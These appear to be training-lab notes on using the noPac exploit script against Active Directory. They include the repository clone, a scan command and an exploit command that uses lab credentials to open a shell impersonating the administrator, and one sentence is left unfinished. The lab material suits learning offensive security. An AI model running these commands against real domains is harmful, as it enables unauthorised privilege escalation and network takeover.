# Use NoPac.py

noPac.py is a Python exploit script used to abuse the noPac vulnerability in Active Directory.

The vulnerability combines:

CVE-2021-42278
CVE-2021-42287

to let an attacker escalate privileges from a normal domain user to potentially

## Git clone it

git clone https://github.com/Ridter/noPac.git

## Scan first

sudo python3 /opt/noPac/scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

## Gain interactive shell

sudo python3 /opt/noPac/noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

